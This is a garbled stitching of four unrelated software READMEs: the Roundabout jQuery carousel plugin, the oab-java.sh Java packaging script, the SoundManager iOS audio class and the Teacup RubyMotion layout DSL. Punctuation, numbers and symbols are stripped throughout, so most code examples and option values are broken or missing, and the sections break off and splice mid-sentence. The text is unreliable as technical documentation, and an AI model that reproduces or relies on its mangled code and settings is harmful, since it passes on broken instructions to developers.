2603226, note roundabout is no longer under active development i ve moved the documentation over here to support the exists plugin but there are known issues and such that won t be fixed use at your own risk roundabout is a jquery plugin that easily converts unordered lists other nested html structures into entertaining interactive turntable like areas it s ready to go straight out of the box but if you want to get crazy roundabout is highly customizable with an extensive api that allows for some pretty amazing results roundabout requires jquery at least version   roundabout is equipped to play nicely with a couple of other plugins if they re made available roundabout can move in more ways than just a turntable with shapes you have many other ways you can move your content around the page jquery comes with two easing styles built in but this plugin adds many many more include this script and use any of its defined easing functions in your roundabout animations in addition to rotating on click roundabout can also move by clicking and dragging on the roundabout element itself include these scripts and turn on enabledrag the list above is only a list of the plugins that have support baked in but roundabout will play nicely with many other plugins it s up to you to integrate those yourself include the jquery roundabout js javascript file on your page after you include jquery itself also either link to the included css file or copy the css styles from that file and paste them into your site s css file to activate roundabout in its simplest form you can do this javascript ul roundabout of course this will change all of your ul elements into roundabouts which probably isn t what you want but you can easily change the selector to only target the elements you wish to convert you can set options on roundabout to change how it behaves do this by passing in an object of options into the main roundabout call upon initialization like so javascript ul roundabout btnnext next if you re using the sister plugin roundabout shapes be sure to include the jquery roundabout shapes js file after you include the main roundabout javascript file next you ll select the shape as on of the options that you pass into roundabout upon initialization javascript ul roundabout btnnext next  shape figure roundabout comes with a number of methods you can call to better control how it works calling those methods are done by re calling roundabout on the element that roundabout is already working on and passing in the name of the method to use as the first parameter if the method requires other parameters pass those in as subsequent parameters for example instead of using the btnnext option you can manually implement this yourself like this javascript btnnext  function e e stoppropagation e preventdefault and and this is the action ul myroundabout roundabout animatetonextchild return false lately it seems that this doesn t work as well as it once did not sure why but you can still enable it to do this you ll need to grab v of the jquery event drag and jquery event drop plugins by threedubmedia include them on your page after roundabout is included next enable your roundabout to use drag and drop like so javascript ul roundabout enabledrag true autoplay lets you have roundabout automatically animate on an interval this functionality is included with the roundabout core so no additional scripts are needed to get this working to enable autoplay there are three options you can set javascript ul roundabout autoplay true autoplayduration  autoplaypauseonhover true the first option autoplay will turn on autoplay the second autoplayduration is the length of time in milliseconds between animation triggers the final option autoplaypauseonhover will force autoplay never to figure while the user has their cursor over the roundabout itself version  the current version works reasonably well although if you look in the issues you ll see a number of things that don t work for some people as mentioned above this plugin is no longer under active development feel free to continue submitting issues for others to see but no further official action can be guaranteed at all roundabout comes with many settable configuration options that let you customize how it operates th scope col option and th th scope col description and th th scope col data type and th th scope col class default value default and th and thead the starting direction in which roundabout should face relative to the code focusbearing and code slightly alters the calculations of moving elements in the default code shape and code  it adjusts the apparent code tilt and code other shapes will differ the lowest z index that will be assigned to a moving element this occurs when the moving element is opposite of that is  away from the code focusbearing and code the greatest z index that will be assigned to a moving element this occurs when the moving element is at the same bearing as the code focusbearing and code the lowest opacity that will be assigned to a moving element this occurs when the moving element is opposite of that is  away from the code focusbearing and code the greatest opacity that will be assigned to a moving element this occurs when the moving element is at the same bearing as the code focusbearing and code the lowest size relative to its starting size that will be assigned to a moving element this occurs when the moving element is opposite of that is  away from the code focusbearing and code the greatest size relative to its starting size that will be assigned to a moving element this occurs when the moving element is at the same bearing as the code focusbearing and code the length of time roundabout will take to move from one child element being in focus to another when an animation is triggered this value acts as the default for roundabout but each animation action can be given a custom duration for that animation a jquery selector of page elements that when clicked will trigger the roundabout to animate to the next moving element a function that will be called once the animation triggered by a code btnnext and code related click has finished a jquery selector of page elements that when clicked will trigger the roundabout to animate to the previous moving element a function that will be called once the animation triggered by a code btnprev and code releated click has finished a jquery selector of page elements that when either starting or stopping a jquery selector of page elements that when clicked will start the roundabout s code autoplay and code feature if it s currently stopped a jquery selector of page elements that when clicked will stop the roundabout s code autoplay and code feature if it s current playing the easing function to use when animating roundabout with no other plugins the standard jquery easing functions are available when using the jquery easing plugin all of its easing functions will also be available when code true and code  roundabout will bring non focused moving elements into focus when they re clicked otherwise click events won t be captured and will be passed through to the moving child elements a function that will be called once the code clicktofocus and code animation has completed the bearing that roundabout will use as the focus point all animations that move roundabout between children will animate the given child element to this bearing the path that moving elements follow by default roundabout comes with one shape which is code lazysusan and code when using roundabout with the roundabout shapes plugin there are many other shapes available when code true and code  roundabout will replace the contents of moving elements with information about the moving elements themselves a jquery selector of child elements within the elements roundabout is called upon that will become the moving elements within roundabout by default roundabout works on unordered lists but it can be changed to work with any nested set of child elements the child element that will start at the roundabout s code focusbearing and code on load this is a zero based counter based on the order of markup when code true and code  reverses the direction in which roundabout will operate by default em next and em animations will rotate moving elements in a clockwise direction and em previous and em animations will be counterclockwise using reflect will flip the two the maximum distance two values can be from one another to still be considered equal by roundabout s standards this prevents javascript rounding errors when true roundabout will automatically advance the moving elements to the next child at a regular interval settable as code autoplayduration and code the length of time in milliseconds to delay the start of roundabout s configured code autoplay and code option this only works with setting code autoplay and code to code true and code  and only on the first start of code autoplay and code the length of time in milliseconds between animation triggers when a roundabout s code autoplay and code is playing when code true and code  roundabout will pause code autoplay and code when the user moves the cursor over the roundabout container requires event drag event drop plugins by threedubmedia allows a user to rotate roundabout be clicking and dragging the roundabout area itself the length of time in milliseconds the animation will take to animate roundabout to the appropriate child when the roundabout is  dropped  the easing function to use when animating roundabout after it has been  dropped  with no other plugins the standard jquery easing functions are available when using the jquery easing plugin all of its easing functions will also be available the animation method to use when a dragged roundabout is  dropped  valid values are em next and em  em previous and em  or em nearest and em a function that will be called once the dropped animation has completed the axis along which drag events are measured valid values are em x and em and em y and em alters the rate at which dragging moves the roundabout s moving elements higher numbers will cause the moving elements to move less when code true and code  a code focus and code event will be triggered on the child element that moves into focus when it does so when code true and code  a code blur and code event will be triggered on the child element that moves out of the focused position when it does so when code true and code  attaches a resize event onto the window and will automatically relayout roundabout s child elements as the holder element changes size and tbody roundabout does a lot on its own but all of the methods it uses internally to perform actions are publicly usable as well manually calling these methods give even more control over how roundabout functions starts the roundabout javascript roundabout

of the oracle end user license agreement if you or your organisation has found oab java sh useful please consider donating to this project it is nice to have the effort i ve put into this script recognised i don t ask for much it is at your discretion sudo and oab java sh optional parameters  build oracle java packages instead of sun java c remove pre existing packages from and var and local and oab and deb and sources from and var and local and oab and src k gpg key id use the specified existing key instead of generating one s skip building if the packages already exist t specify the java version tag to use from the upstream debian packaging script h this help like this cd and chmod and x oab java sh sudo and oab java sh if you are behind a proxy you may need to run using sudo i and oab java sh if you want to see what this script is doing while it is running then execute the following from another shell tail f and oab java sh log this script is merely a wrapper for the most excellent debian packaging scripts prepared by janusz dziemidowicz the basic execution steps are remove my now disabled java ppa ppa flexiondotorg and java install the tools required to build the java packages create download cache in and var and local and oab and pkg download the i and x java install binaries from oracle yes both are required for sun java only build the java packages applicable to your system create local apt repository in and var and local and oab and deb for the newly built java packages create a gnupg signing key in and var and local and oab and gpg if none exists sign the local apt repository using the local gnupg signing key this script will no longer try and directly install or upgrade any java packages instead a local apt repository is created that hosts locally built java packages applicable to your system it is up to you to install or upgrade the java packages you require using apt get aptitude or synaptic etc for example once this script has been run you can simply install the jre by executing the following from a shell sudo apt get install sun java jre or if you ran the script with the  option sudo apt get install oracle java jre if you already have the official ubuntu packages installed then you can upgrade by executing the following from a shell sudo apt get upgrade the local apt repository is just that local it is not accessible remotely and oab java sh will never enable that capability to ensure compliance with oracle s asinine license requirements by default the script creates a temporary gpg keyring in the working directory in order to use the current user s gpg chain instead specify the key id of an existing secret key run gpg k to list available keys building java  on ubuntu lucid   is no longer supported as the upstream scripts

supported deployment target ios   and mac os   earliest compatible deployment target ios   and mac os    bit note supported means that the library has been tested with this version compatible means that the library should work on this ios version i e it doesn t rely on any unavailable sdk features but is no longer being tested for compatibility and may require tweaking or bug fixes to run correctly arc compatibility  as of version   soundmanager requires arc if you wish to use soundmanager in a non arc project just add the fobjc arc compiler flag to the soundmanager m class to do this go to the build phases tab in your target settings open the compile sources group double click irate m in the list and type fobjc arc into the popover if you wish to convert your whole project to arc comment out the error line in soundmanager m then run the edit refactor convert to objective c arc tool in xcode and make sure all files that you wish to use arc for including soundmanager m are checked installation  to use the soundmanager class in an app just drag the class files into your project for ios apps or mac os apps with a deployment target of   lion or above you will also need to add the avfoundation framework  the soundmanager package defines two classes the soundmanager class itself which is documented below and the sound class which is used as a wrapper around each sound file being played the sound class can be used either directly or with the soundmanager class sound properties  property nonatomic readonly copy nsstring name the name of the sound this is either the name that was passed to the soundnamed constructor method or the last path component of the sound file property nonatomic readonly strong nsurl url the absolute url of the sound file property nonatomic readonly nstimeinterval duration the duration in seconds of the sound file property nonatomic assign nstimeinterval currenttime the current time offset in seconds of the sound file this value is readwrite so you can for example set it to zero to rewind the sound property nonatomic readonly getter isplaying bool playing returns yes if the sound is currently playing and no if it isn t read only property nonatomic assign getter islooping bool looping returns yes if the sound has been set to loop and no if it hasn t property nonatomic copy soundcompletionhandler completionhandler a callback block that will be called when the sound finishes playing or is stopped only one completionhandler block can be set on any given sound instance but if you need multiple objects to track the sound s status you can add observers for the sounddidfinishplayingnotification notification instead property nonatomic assign float basevolume the maximum volume of the sound some sounds are louder than others and it can be annoying trying to manage the volumes of different sounds in your app individually in code the basevolume property allows you to equalise the volumes of different sounds on creation then you can adjust their volumes consistently from that point on property nonatomic assign float volume the sound volume this is multiplied by the basevolume property to get the actual volume defaults to   maximum property nonatomic assign float pan the left and right stereo pan of the file value ranges from   to   and can be used to shift the location of the sound in space has no effect on mac os   sound methods  and sound soundnamed nsstring name this is a handy shorthand constructor method that returns a sound based on the name of a file in the application bundle if the file extension is omitted it is assumed to be a caf file if you pass a fully qualified path to this method then it behaves the same way as soundwithcontentsoffile and sound soundwithcontentsoffile nsstring path sound initwithcontentsoffile nsstring path and sound soundwithcontentsofurl nsurl url sound initwithcontentsofurl nsurl url these methods create a new sound instance from a file path or url void fadeto float volume duration nstimeinterval duration this method fades a sound from it s current volume to the specified volume over the specified time period note that this method will not play the sound so you will need to call play prior to calling this method unless the sound is already playing void fadein nstimeinterval duration fades the sound volume from   to   over the specified duration the sound volume will be set to zero if it not already see the caveat above about sounds that aren t playing void fadeout nstimeinterval duration fades the sound from it s current volume to   over the specified duration when the sound volume reaches zero the sound s stop method is automatically called void play plays the sound has no effect if the sound is already playing void stop stops the sound has no effect if the sound is not already playing stopping the sound does not reset the currenttime so playing a stopeed sound will resume from the last played time soundmanager properties  property nonatomic readonly getter isplayingmusic bool playingmusic this readonly property reports if the soundmanager is currently playing music property nonatomic assign bool allowsbackgroundmusic this property is used to control the audio session on the iphone to allow ipod music to be played in the background it defaults to no so it should be set to yes before you attempt to play any sound or music if you do not want the ipod music to be interrupted it does nothing on mac os currently property nonatomic assign float soundvolume sets the sound volume affects all currently playing sounds as well as any sounds played subsequently should be in the range   property nonatomic assign float musicvolume sets the music volume affects currently playing music track as well as any music tracks played subsequently should be in the range   property nonatomic assign nstimeinterval musicfadeduration the fade in and out and crossfade duration for music tracks defaults to  second property nonatomic assign nstimeinterval soundfadeduration the fade out time for sounds when stopsound is called defaults to  second soundmanager methods  and soundmanager sharedmanager this class method returns a shared singleton instance of the soundmanager void preparetoplay the preparetoplay method preloads a random sound from your application bundle which initialises the audio playback it should be called before you attempt to play any audio ideally during the startup sequence to eliminate the delay when you first play a sound or music track note this will only work if at least one sound file is included in the root of your application bundle if all of your sound files are in folders consider adding an additional short silent sound file for initialisation purposes or use the preparetoplaywithsound method instead void preparetoplaywithsound id soundorname if your sounds are not located in the root of the application bundle or even in the bundles at all then the standard preparetoplay method won t work in this case you can use the preparetoplaywithsound method instead and specify a particular sound to use for initialisation the parameter can be a filename path either relative or absolute or an instance of the sound class void playsound id soundorname looping bool looping fadein bool fadein void playsound id soundorname looping bool looping void playsound id soundorname the play method will play a sound the parameter can be either a previously created sound instance or a name or path for a sound file to be loaded you can include the file extension in the name or omit it in which case the soundmanager will look for a matching file with the caf file extension if the looping argument is yes the sound will continue to play until stopsound is called if the fadein argument is yes the sound will fade in from zero to full volume over the time specified by the soundfadeduration property of the soundmanager class if omitted looping and fadein both default to no void stopsound id soundorname fadeout bool fadeout void stopsound id soundorname this method will either stop the sound immediately or fade it out over the period specified by soundfadeduration  depending on the fadeout argument defaults to yes the soundorname parameter can be either a previously created sound instance or a name or path if there are multiple instances of the sound playing then they will all be stopped void stopallsounds bool fadeout void stopallsounds this method will stop and and or fade out all currently playing sounds but not music it is equivalent to calling stopsound for each sound that is playing void playmusic id soundorname looping bool looping fadein bool fadein void playmusic id soundorname looping bool looping void playmusic id soundorname this method plays a music track if the fadein argument is yes the music will fade in from silent to the volume specified by the musicvolume property over a period of time specified by musicfadeduration defaults to yes if omitted the sound manager only allows one music track to be played at a time so if an existing track is playing it will be faded out if the looping argument is yes the music will continue to play until stopmusic is called defaults to yes if omitted void stopmusic bool fadeout void stopmusic this will stop and and or fade out the currently playing music track over the period specified by musicfadeduration notifications  sounddidfinishplayingnotification this notification is fired via nsnotificationcenter whenever a sound finishes playing either due to it ending naturally or because the stop method was called the notification object is an instance of the sound class which is used internally by soundmanager to play sound and music files you can access the sound class s name property to find out which sound has finished supported formats  the iphone can be quite picky about which sounds it will play for best results use caf files which you can generate using the

or somewhere near the controller ruby teacup stylesheet new mainwindow do style hibutton origin    title hi teacup s goal is to facilitate the creation and styling of your view hierarchy say goodbye to xcode xib files teacup is composed of two systems layouts a dsl to create views and to organize them in a hierarchy you assign the style name and style classes from these methods stylesheets store the styles that get applied to your views the stylesheet dsl is meant to resemble css but is targeted at ios and so the precedence rules are very different teacup supports pixate and nui  too so you can use those systems for styling and teacup to manage your view hierarchy and apply auto layout constraints teacup can also integrate with the motion layout gem there is one significant change in version   in every version of teacup prior from    to    the controller layout was usually created by calling a class method called layout it was discovered embarrassingly late that this system is causing memory leaks to fix it we had to remove this feature altogether so if you are looking at old teacup examples you will see this block syntax that is no longer offered it is easy to update to   though class mycontroller uiviewcontroller layout rootstylename do this block is what caused the memory leak teacup code goes here class mycontroller uiviewcontroller def teacuplayout in   we just changed it to be a method introduced in   this is how you assign a stylename to the root view root rootstylename background uicolor bluecolor teacup code goes here no other code changes necessary actually this method still works as long as you don t pass a block it s the same as calling root stylename layout rootstylename layouts layouts  define your views stylesheets stylesheets  style your

gotchas advanced teacup tricks advanced teacup tricks including teacup layout on arbitrary classes including teacup layout on arbitrary classes sweettea sweettea misc notes misc notes the dummy the dummy  fixes  uncompiled selector errors the teacup layout module is mixed into uiviewcontroller and uiview on ios and nswindowcontroller  nsviewcontroller  and nsview on os x these classes can take advantage of the view hierarchy dsl you saw an example in the primer using the uiviewcontroller and nswindowcontroller class method layout and the teacuplayout method you could just as easily use teacup s dsl to create your views from a loadview method for instance you might want to use a custom view subclass as your root view an example might look like this class mycontroller uiviewcontroller def loadview we will create the controller s view assigning it the stylename root self view layout fancyview root do these subviews will be added to self view subview uitoolbar toolbar subview uibutton hibutton you can use very similar code in your view subclasses def myview uiview def initwithframe frame super tap do self stylesheet mystylesheet subview uiimageview image the layout and subview methods are the work horses of the teacup view dsl layout view and viewclass stylename styleclasses additionalstyles block view and viewclass you can layout an existing class or you can have teacup create it for you it just calls new on the class nothing special this argument is required stylename symbol this is the name of a style in your stylesheet it is optional styleclasses symbol other stylenames they have lower priority than the stylename additionalstyles hash you can pass other styles in here as well either to override or augment the settings from the stylesheet it is common to use this feature to assign the delegate or datasource block see discussion below returns the view that was created or passed to layout only the view arg is required you can pass any combination of stylename styleclasses and additionalstyles some none or all subview view and uiviewclass stylename styleclasses additionalstyles block identical to layout  but adds the view to the current target the reason it is so easy to define view hierarchies in teacup is because the layout and subview methods can be nested by passing a block subview uiview container do create a uiview instance and give it the stylename container subview uiview inputs do create another container these views will be added to the inputs view emailinput subview uitextfield emailinput passwordinput subview uitextfield passwordinput this view will be added to container subview uibutton buttonwithtype uibuttontyperoundedrect  submitbutton these methods are defined in the layout module and guess what it s easy to add your own view helpers i refer to this as a partials system but really it s just ruby code and isn t that the best system module teacup layout creates a button and assigns a default stylename def button args block apply a default stylename args button if args empty instantiate a button and give it a style class subview uibutton buttonwithtype uibuttontypecustom  args block creates a button with an icon image and label def buttonwithicon icon title label uilabel new label text title label sizetofit imageview uiimageview new imageview image icon imageview sizetofit button uibutton buttonwithtype uibuttontypecustom button addsubview imageview button addsubview label code could go here to position the icon and label or at could be handled by the stylesheet subview button class mycontroller uiviewcontroller def teacuplayout button button button button bluebutton button buttonwithicon uiimage imagenamed emailicon  email the controller teacuplayout method is going to be the first or second thing you add to a controller when you are building an app with teacup inside you will add subviews using subview or you can create a view using the layout method subview delegates most of its work to layout after the views have been added and styles have been applied teacup calls the layoutdidload method if you need to perform some additional initialization on your views you can do it in this method stylesheets  this is where you will store your styling related code migrating code from your controller or custom view into a stylesheet is very straightforward the method names map   def viewdidload self view backgroundcolor uicolor graycolor  def viewdidload self stylesheet main self view stylename root teacup stylesheet new main do style root backgroundcolor uicolor graycolor nice we turned three lines of code into nine well obviously the benefits come in when we have lots of style code and when you need to do app wide you can store stylesheets in any file it is common to use app and styles rb or app and styles and main rb  if you have more than a few of em the teacup stylesheet constructor accepts a stylesheet name and a block which will contain your style declarations teacup stylesheet new mainmenu do style readytoplaybutton backgroundcolor uicolor blackcolor frame      teacup stylesheet mainmenu returns this stylesheet any method that accepts a single value can be assigned in a stylesheet please don t abuse this by hiding application logic in your stylesheets these are meant for design  not behavior if you want to use a shorter syntax you can use the limelight inspired teacup stylesheet new mainmenu do readytoplaybutton do backgroundcolor uicolor blackcolor frame      this creates the same style hashes as style readytoplaybutton  so you have access to all the features that are available in the traditional syntax styles are be applied via stylename style label or class style uilabel styles can extend other styles style bigbutton extends button a stylesheet can import other stylesheets import app the special appearance stylesheet can be used to apply styles to uiappearance teacup appearance new let s look at each in turn this is the most common way to apply a style class maincontroller uiviewcontroller stylesheet main assigns the stylesheet named main to this controller def teacuplayout subview uilabel h h is the stylename teacup stylesheet new main do stylesheet name style h style name font uifont systemfontofsize  and this style is applied when the stylesheet is applied at the end of the layout block when all the views have been added  its font property will be assigned the value uifont systemfontofsize  but we didn t assign any text we can tackle this a couple ways you can apply last minute styles in the layout and subview methods def teacuplayout subview uilabel h the subview and layout methods can apply styles text omg it s full of stars in this case though we just have static text so you can assign the text using the stylesheet teacup stylesheet new main do style h font uifont systemfontofsize  style mainheader text omg it s full of stars  font uifont systemfontofsize  not very dry though is it we have to use a new style mainheader because not all our labels say omg  but we want to use our font from the h style we can tell the mainheader style that it extends the h style def teacuplayout subview uilabel mainheader teacup stylesheet new main do style h font uifont systemfontofsize  style mainheader extends h text omg it s full of stars a common style when writing stylesheets is to use variables to store settings you want to re use teacup stylesheet new main do hfont uifont systemfontofsize  style h font hfont style mainheader extends h text omg it s full of stars and you re not limited to one class that you can extend it accepts an array teacup stylesheet new main do hfont uifont systemfontofsize  style h font hfont style label textcolor uicolor black style mainheader extends h label  text omg it s full of stars if you need to apply styles to all instances of a uiview and nsview subclass you can do so by applying styles to a class name instead of a symbol this feature is handy at times when you might otherwise use uiappearance which teacup also supports teacup stylesheet new app do style uilabel font uifont systemfontofsize  style uitableview backgroundcolor uicolor blackcolor we ve touched on the ability to write styles extend styles and apply styles to a class now we can introduce another feature that is even more useful for applying styles to your entire app import a stylesheet when you import a stylesheet you receive all of its style s and you gain access to its instance variables this way you can define colors and margins and such in a parent stylesheet teacup stylesheet new app do headercolor uicolor colorwithred  and   green  and   blue  and   alpha  backgroundcolor uicolor colorwithred  and   green  and   blue  and   alpha  style root backgroundcolor backgroundcolor style header textcolor headercolor teacup stylesheet new main do import app style subheader extends header the header style is imported from the app stylesheet style button titlecolor headercolor headercolor is imported too ios only and lastly the uiappearance protocol is supported by creating an instance of teacup appearance there is debatable benefit to using uiappearance  because it will apply styles to views that are outside your control like the camera and image pickers and email and message controllers but it does come in handy sometimes so here it is teacup appearance new do uinavigationbar appearance setbartintcolor uicolor blackcolor style uinavigationbar bartintcolor uicolor blackcolor titletextattributes uitextattributefont uifont fontwithname trebuchet ms  size   uitextattributetextshadowcolor uicolor colorwithwhite   alpha    uitextattributetextcolor uicolor whitecolor uinavigationbar

teacup appearance apply it will get called automatically using the uiapplicationdidfinishlaunchingnotification  but that notification is triggered after the method appdelegate didfinishlaunching withoptions is called class appdelegate def didfinishlaunching application withoptions options teacup appearance apply window uiwindow alloc initwithframe uiscreen mainscreen bounds ctlr maincontroller new window rootviewcontroller uinavigationcontroller alloc initwithrootcontroller ctlr window makekeyandvisible that block is called using the uiapplicationdidfinishlaunchingnotification  but that notification is not called until the end of the application applicationdidfinishlaunchingwithoptions launchoptions method this is sometimes after your views have been created and so they will not be styled if that is the case call teacup appearance apply before creating your rootviewcontroller you have enough information right now to go play with teacup check out the example apps write your own whatever but read on to hear about why teacup is more than just writing layouts and applying styles you should also be sure to read the misc notes misc notes section at the bottom these aren t very well organized but the information is important you can learn about features any time but learning about the gotcha s sooner rather than later could save you a lot of time teacup as a utility  when you are prototyping an app it is useful to bang out a bunch of code quickly and here are some ways that teacup might help you can use all the methods above without having to rely on the entirety of teacup s layout and stylesheet systems by that i mean any time you are creating a view hierarchy don t be shy about using teacup to do it uiview and nsview have the style method which can be used to group a bunch of customizations anywhere in your code you don t have to pull out a stylesheet to do it self navigationitem titleview layout uilabel text title  font uifont systemfontofsize   def tableview tableview cellforrowatindexpath indexpath cellidentifier mycontroller cell cell tableview dequeuereusablecellwithidentifier cellidentifier unless cell cell uitableviewcell alloc initwithstyle uitableviewcellstyledefault reuseidentifier cellidentifier layout cell contentview do subview uiimageview image return cell label style textcolor uicolor bluecolor text blue label uitableviews  teacup is designed to be used in coordination with the controller life cycle but there are other life cycles that need to be considered as well uitableviews maintain a queue of cells that can be reused and they need to be restyled when the cell is created and re used the solution is to apply the styles and layout constraints inside the tableview willdisplaycell forrowatindexpath delegate method in your delegate if you include the teacup tableviewdelegate module you ll get this behavior for free and if you override this method you can call super to have the teacup method run class tableviewcontroller uitableviewcontroller include teacup tableviewdelegate stylesheet table def tableview tableview cellforrowatindexpath indexpath cell tableview dequeuereusablecellwithidentifier cell id layout cell contentview root do cell titlelabel subview uilabel titlelabel text title indexpath row cell detailslabel subview uilabel detailslabel text details indexpath row cell otherlabel subview uilabel otherlabel text other indexpath row return cell this method is implemented by the teacup tableviewdelegate if you need to implement it be sure to call super def tableview tableview willdisplaycell cell forrowatindexpath indexpath super constraints and styles get applied before the view appears even if the cell is reused later more teacup features  there are a few ok a bunch more features that teacup provides that deserve discussion styling view properties orientation styles view class additions style handlers frame calculations auto layout motion layout motion layout stylesheet extensions styling a uiview is fun but a uiview is often composed of many objects like the layer  or maybe an imageview or textlabel and so on you can style those too style tablecell layer style the layer shadowradius  backgroundview style the background backgroundcolor uicolor blackcolor imageview style the imageview contentmode uiviewcontentmodescaleaspectfill ios only there s more to stylesheets than just translating uiview setters teacup can also apply orientation specific styles these are applied when the view is created using the current device orientation and when a rotation occurs teacup stylesheet new main do this label hides when the orientation is landscape left or right style label landscape hidden true portrait hidden false combine these styles with frame calculations calculations to have you view frame recalculated automatically we ve already seen the teacup related properties stylename  the primary style name styleclasses  secondary style names style  apply styles directly each of these has a corresponding method that you can use to facilitate animations animatetostylename stylename animatetostyles styleclasses animatetostyle properties on os x you have to use the view animator property to perform animations this is supported but it s kind of hacky this feature is used extensively by sweettea to make a more intuitive stylesheet dsl teacup is by itself pretty useful but it really does little more than map hash keys to uiview setters that s great because it keeps the system easy to understand but there are some methods in uikit that take more than one argument or could benefit from some shorthands this is where teacup s style handlers come in they are matched against a uiview subclass and one or more stylenames and they are used to apply that style when you use it in your stylesheet teacup handler uibutton title do and target title and target settitle title forstate uicontrolstatenormal subview uibutton title this is the title this will end up being passed to the handler above layout uinavigationitem title this is the title but this will not the handler above is restricted to uibutton subclasses other built in handlers other handlers are defined in zhandlers rb another useful one is the ability to make view the same size as its parent and located at the origin style container frame full    superview frame size these are super cool just don t forget your autoresizingmasks when positioning views you will often have situations where you want to have a view centered or  pixels to the right of center or full width and height all of these relationships can be described using the teacup calculate method which is called automatically in any method that modifies the frame or center frame origin size top and y left and x right bottom width height centerx and middlex centery and middley center teacup stylesheet new main do style button left  top  easy enough width    woah oo height  style tophalf frame       style bottomhalf frame       when this code executes the string   is translated into the formula   target superview frame size width  if the property is related to the height or y position it will be calculated based on the height the frame calculations must be a string of the form and   and and   and and if you need more math y ness than that you can construct strings using interpolation margin  style button left margin top margin width  margin   height  style tophalf frame       margin and  style bottomhalf frame   and margin and      margin and  one more example the real power of the frame calculations comes when you remember to set springs and struts you can have a view pinned to the bottom if you remember to set the autoresizingmask teacup stylesheet new main do style button fixed width and height height  width  centerx   top    includes an px margin from the bottom autoresizingmask uiviewautoresizingflexibleleftmargin and uiviewautoresizingflexiblerightmargin and uiviewautoresizingflexibletopmargin see the autoresizing extension below for an even better way to write this this is another much bigger topic than it is given space for here teacup includes an auto layout constraint dsl that you can use in your stylesheets these methods are added to the stylesheet class so unless you are in the context of a stylesheet you will have to create your constraints in longhand you can still use the teacup constraint class to help you i won t sugar coat it auto layout is hard much harder than using frames and springs and struts and honestly i recommend you try using the teacup calculate features mentioned above they will take you far but at the end of the day once you really understand the auto layout system that apple released in ios  you can build your uis to be responsive to different devices orientations and sizes uis built with auto layout not usually need to adjust anything during a rotation the constraints take care of it all it s impressive here s a quick example that creates this shape the edges are bound to the superview s frame and and and and and and and a and b and and and and and and and and c and and   of b s height minus  pixels and and and and and and and and fixed  and fixed  teacup stylesheet new do style a constraints these first three are all fixed so super easy constrainleft   constrainwidth   constraintop   here we go here s a real constraint constrain bottom equals superview bottom  style b constraints b left a right constrain left equals a right  b height a height constrain height equals a height  constrain right equals superview right  style c this looks like a very grumpy style c constraints constrainwidth   pin to bottom right corner constrain right equals superview right  constrain bottom equals superview bottom   b height  constrain height equals b height times   minus   writing views this way will either make your brain hurt or make the math nerd in you chuckle with glee in this example you could go completely with just frame calculation formulas and springs and struts your frame code would still be cluttered just cluttered in a different way if you need to reset the list of constraints managed by teacup you can call resetconstraints before you add the new styles to a uiview this can be useful when you need to define a new set of layout constraints for a dynamic set of views this works on os x and ios and you don t have to go changing the idea of top and bottom even though os x uses reversed frames if you are using nick quaranto qrush s motion layout gem you can use it from within any class that includes teacup layout then benefit is that the teacup stylenames assigned to your views will be used in the dictionary that the ascii based system relies on def teacuplayout subview uiview viewa subview uiview viewb subview uiview viewc if you need to apply these to a different view or if you want to assign different names to use in the ascii strings auto layoutview self view layoutsubviews  layoutblock auto do metrics margin  vertical and viewa margin viewb margin viewc and horizontal and margin viewa margin and horizontal and margin viewb margin and horizontal and margin viewc margin and auto layout is just one stylesheet extension there are a few others and if you want to write your own just open up the teacup stylesheet class and start adding methods if you ve used the sugarcube uiautoresizingmask methods you ll recognize these they are handy and hopefully intuitive shorthands for common springs and struts in previous versions of teacup these were available without needing the autoresize prefix the old methods are still available but deprecated style container autoresizingmask autoresize flexiblewidth and autoresize flexibleheight style container autoresizingmask autoresize flexiblewidth and flexibleheight style container autoresizingmask autoresize fill the autoresize methods are grouped into four categories flexible fill fixed and float the flexible methods correspond   with the uiviewautoresizing constants the fill methods fillfilltopfillbottomfillleftfillright will stretch the width or height or both the location specifies where the view is pinned so filltop will stretch the width and bottom margin but keep it the same distance from the top not necessarily at the top but a fixed distance fillright will pin it to the right side stretch the height and have a flexible left margin the fixed methods pin the view to one of nine locations topleft and topmiddle

you don t want your view pinned to any corner and you don t want it to change size incidentally floathorizontal and floatvertical fixedmiddle ios only because the stylesheets are defined in a block you can perform tests for device and screen size before setting styles for instance on an ipad you might want to have a larger margin than on the iphone the stylesheet device methods will help you create these conditions teacup stylesheet new do if deviceis iphone margin  elsif deviceis ipad margin  style container frame margin margin   margin    margin  multiple calls to style will add those styles not replace so this code works just fine teacup stylesheet new do style logo origin   if deviceis iphone style logo image uiimage imagenamed small logo elsif deviceis ipad style logo image uiimage imagenamed big logo ios only because you can animate changes to the stylename or styleclasses you can make it pretty easy to apply rotation effects to a uiview or calayer the styleclasses property is especially useful for this purpose style container frame full style rotated transform transformview rotate pi and  pi and transformview are methods on stylesheet style notrotated transform transformview rotate  style rotated layer transform transformlayer rotate pi and  style notrotated layer transform transformlayer rotate  these work even better when used with the geomotion methods

careful when extending styles and using orientation styles because the precedence rules take some getting used to the goal is that you can have all your style code in the stylesheets but you also need to be able to animate your views and rotating the device should not go reseting everything so here s what happens when your controller is loaded viewdidload is called and that s where teacup creates the view hierarchy and applies the styles it is at the end of the method that the styles are applied not until all the views have been added the current device orientation will be used so that orientation specific styles will be applied now teacup goes quiet for a while your app chugs along until the user rotates the device if you have orientation specific styles they will get applied but the original styles the generic styles will not however there s a way around that too if you call restyle on a uiview  that will reapply all the original stylesheet styles orientation and generic styles with me so far orientation styles are reapplied whenever the device is rotated but generic styles are only applied in viewdidload and when restyle is called explicitly how does the extends property affect things if your stylesheet defines orientation specific styles and generic styles the orientation specific styles win but if you extend a style that has orientation specific styles your local generic styles will win the more local styles always win and that applies to styles that you add using the subview and layout methods too the only time it doesn t really apply is if you apply styles using uiview style or uiview applystylename those are one shot they can get overwritten when restyle is called there are also times when you either want or must override or add to the stylesheet styles for instance if you want to assign the delegate or datasource properties this cannot be done from a stylesheet but that s okay because we have a chance to add these styles in the subview and layout def teacuplayout subview uitableview delegate self styles applied here are one shot it is the exact same as assigning the stylename and styleclasses and then calling style because the stylesheet is not necessarily applied immediately these styles could be overwritten before they take effect def teacuplayout tableview subview uitableview tableview delegate self font uifont boldsystemfontofsize  the stylesheet could override this during rotation def layoutdidload tableview applystylename tableviewinit this will only get applied once the idea here is that the closer the style setting is to where the view is instantiated the higher the precedence more examples class mycontroller uiviewcontroller stylesheet mysheet def teacuplayout subview uilabel label text overrides teacup stylesheet new mysheet do style genericlabel text portrait  these get applied initially but after being rotated they will not get applied again font uifont boldsystemfontofsize   textcolor uicolor graycolor landscape font uifont 